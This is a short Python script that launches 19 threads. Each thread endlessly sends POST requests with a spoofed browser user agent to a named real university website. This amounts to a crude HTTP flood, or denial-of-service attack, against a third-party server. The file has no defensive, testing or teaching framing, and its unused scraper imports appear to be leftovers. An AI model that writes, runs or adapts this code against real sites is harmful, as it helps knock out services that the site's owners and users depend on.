import requests, os, time
from bs4 import BeautifulSoup
import threading
 
try:
    os.mkdir('pics')
except:
    pass
 
url = 'http://comm.xmu.edu.cn'
headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:33.0) Gecko/20100101 Firefox/33.0'
    }
def heihei():
    while True:
        try:
            print(1)
            session = requests.session()
            session.post(url, data={}, headers=headers, params={})
        except:
            pass
threads = []
for i in range(1, 20):
    threads.append(threading.Thread(target=heihei))

for t in threads:
    t.setDaemon(False)
    t.start()
